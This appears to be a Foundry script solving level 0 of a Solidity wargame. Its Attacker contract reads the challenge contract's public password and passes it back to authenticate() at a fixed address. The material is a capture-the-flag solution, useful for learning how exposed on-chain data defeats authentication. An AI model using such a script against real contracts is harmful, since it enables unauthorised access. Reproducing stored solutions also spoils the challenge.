// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "instances/level00.sol";
import "forge-std/Test.sol";

contract Attacker is Test {
    Instance level00 = Instance(0x080f1E5F240DA0d80A296a1693Aa16FF032D0894);

    function run() external {
        vm.startBroadcast();

        level00.authenticate(level00.password());

        vm.stopBroadcast();
    }
}
